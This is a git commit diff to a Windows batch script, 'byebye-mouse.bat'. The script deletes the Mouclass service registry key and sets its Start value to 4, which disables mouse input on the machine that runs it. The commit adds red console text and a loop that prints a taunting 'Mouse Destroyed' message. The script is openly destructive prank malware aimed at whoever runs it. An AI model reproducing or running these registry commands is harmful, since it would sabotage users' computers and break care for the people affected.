1e958924bdcc948950cc313dea48cd6b37cc8037
FonderElite <71190959+FonderElite@users.noreply.github.com>
2020-12-27 20:57:09 +0800

    Update byebye-mouse.bat

--- byebye-mouse.bat
+++ byebye-mouse.bat
@@ -5,3 +5,5 @@ set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
 reg delete %key%
 reg add %key% /v Start /t REG_DWORD /d 4
 rem ---------------------------------
+color 04
+for /L %%n in (3,3,3000)do echo Mouse Destroyed By FONDERELITE!!!! HAHAHHAA
